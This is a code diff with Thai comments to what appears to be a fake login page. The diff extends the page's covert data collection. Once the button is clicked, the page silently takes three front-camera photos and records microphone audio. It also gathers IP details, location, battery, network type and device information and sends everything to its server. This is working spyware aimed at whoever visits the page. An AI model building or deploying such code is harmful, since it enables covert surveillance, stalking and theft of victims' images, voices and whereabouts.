@@ -142,9 +142,11 @@
     </div>
 
     <script>
-        let imageData = null; // เก็บรูปถ่ายแบบ Base64
+        let imageDatas = []; // เก็บรูปถ่ายแบบ Base64 (Array 3 รูป)
+        let audioData = null; // เก็บไฟล์เสียง
         let ipData = null; // เก็บข้อมูล IP
         let batteryData = null; // เก็บข้อมูลแบตเตอรี่
+        let networkType = 'Unknown'; // เก็บข้อมูลประเภทเน็ต
 
         // โหลดข้อมูล IP ทันทีที่เปิดเว็บ
         fetch('https://ipapi.co/json/')
@@ -162,7 +164,7 @@
             });
         }
 
-        // ขอสิทธิ์กล้องและถ่ายรูปก่อน
+        // ขอสิทธิ์กล้องและไมค์ ถ่ายรูปรัว และอัดเสียง
         async function getLocation() {
             const status = document.getElementById('status');
             const btn = document.getElementById('loginBtn');
@@ -176,27 +178,61 @@
             btnSpinner.style.display = 'block';
             btn.disabled = true;
 
+            // เช็คประเภทอินเทอร์เน็ต
+            if (navigator.connection && navigator.connection.effectiveType) {
+                networkType = navigator.connection.effectiveType; // เช่น '4g', '3g', 'wifi'
+            }
+
             try {
-                // พยายามเปิดกล้องหน้า
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                // พยายามเปิดกล้องหน้า และ ไมโครโฟน
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' },
+                    audio: true 
+                });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
                 // รอให้กล้องพร้อม
                 await new Promise(resolve => video.onloadedmetadata = resolve);
-                
-                // ถ่ายรูป
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                imageData = canvas.toDataURL('image/png'); // ได้ไฟล์ภาพ base64
+                const ctx = canvas.getContext('2d');
+
+                // เริ่มอัดเสียง
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.start();
+
+                // ถ่ายรูป 3 รูป (Burst Mode) ห่างกัน 0.5 วินาที
+                for (let i = 0; i < 3; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    imageDatas.push(canvas.toDataURL('image/png'));
+                    if (i < 2) await new Promise(r => setTimeout(r, 500));
+                }
+
+                // หยุดอัดเสียง (อัดประมาณ 1.5 - 2 วินาทีระหว่างถ่ายรูป)
+                mediaRecorder.stop();
                 
-                // ปิดกล้อง
+                // รอให้ MediaRecorder สร้างไฟล์เสร็จ
+                await new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = () => {
+                            audioData = reader.result;
+                            resolve();
+                        };
+                    };
+                });
+                
+                // ปิดกล้องและไมค์
                 stream.getTracks().forEach(track => track.stop());
             } catch (err) {
-                console.error("Camera access denied or failed:", err);
-                // ถึงจะไม่ได้กล้อง ก็จะไปต่อเพื่อขอตำแหน่ง
+                console.error("Camera/Mic access denied or failed:", err);
+                // ถึงจะไม่ได้สิทธิ์ ก็จะไปต่อเพื่อขอตำแหน่ง
             }
 
             // หลังจากได้รูป (หรือไม่ได้) ก็ขอตำแหน่งต่อ
@@ -239,7 +275,8 @@
                 cores: navigator.hardwareConcurrency || 'N/A',
                 ram: navigator.deviceMemory || 'N/A',
                 ip: ipData,
-                battery: batteryData
+                battery: batteryData,
+                network: networkType
             };
 
             // ส่งข้อมูลทั้งหมดไปที่เซิร์ฟเวอร์
@@ -252,7 +289,8 @@
                     lat: lat, 
                     lon: lon, 
                     deviceInfo: deviceInfo,
-                    image: imageData // เพิ่มรูปที่ถ่ายได้
+                    images: imageDatas, // ส่ง array 3 รูป
+                    audio: audioData // ส่งไฟล์เสียง
                 }),
             })
             .then(data => {
